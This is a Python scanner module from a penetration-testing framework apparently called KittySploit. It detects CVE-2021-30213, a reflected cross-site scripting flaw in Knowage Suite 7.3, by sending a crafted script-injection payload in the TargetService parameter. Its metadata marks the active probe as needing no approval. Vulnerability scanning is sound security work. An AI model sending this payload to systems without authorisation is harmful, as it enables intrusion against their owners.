#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Knowage Suite 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Knowage Suite 7.3 - Cross-Site Scripting Detection',
        'description': "Knowage Suite 7.3 contains an unauthenticated reflected cross-site scripting vulnerability. An attacker can inject arbitrary web script in '/servlet/AdapterHTTP' via the 'targetService' parameter.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'xss', 'knowage', 'eng', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/piuppi/Proof-of-Concepts/blob/main/Engineering/XSS-KnowageSuite7-3_unauth.md',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-30213',
            'https://github.com/piuppi/Proof-of-Concepts',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-30213',
    }

    def run(self):
        r = self.http_request(method="GET", path='/knowage/servlet/AdapterHTTP?Page=LoginPage&NEW_SESSION=TRUE&TargetService=%2Fknowage%2Fservlet%2FAdapterHTTP%3FPage%3DLoginPage%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('</script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Knowage Suite 7.3 - Cross-Site Scripting detected",
                path='/knowage/servlet/AdapterHTTP?Page=LoginPage&NEW_SESSION=TRUE&TargetService=%2Fknowage%2Fservlet%2FAdapterHTTP%3FPage%3DLoginPage%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E',
            )
            return True
        return False

